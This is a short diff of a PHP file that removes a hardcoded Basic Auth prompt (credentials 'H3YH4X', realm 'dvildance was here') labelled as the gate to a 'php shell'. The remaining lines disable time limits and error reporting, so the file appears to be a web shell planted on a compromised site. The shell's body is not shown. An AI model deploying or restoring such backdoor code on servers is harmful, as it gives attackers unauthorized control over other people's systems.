@@ -1,24 +1,4 @@
-
 <?php
-// --- pop-up
-
-$user = "H3YH4X";
-
-$pass = "H3YH4X";
-
- if (($_SERVER["PHP_AUTH_USER"] != $user) || (($_SERVER["PHP_AUTH_PW"]) != $pass))
-
- {
-
-  header("WWW-Authenticate: Basic realm=\"dvildance was here\"");
-
-  header("HTTP/1.0 401 Unauthorized");
-
-  exit();
-
- }
-
-// --- php shell 
 set_time_limit(0);
 error_reporting(0);
 
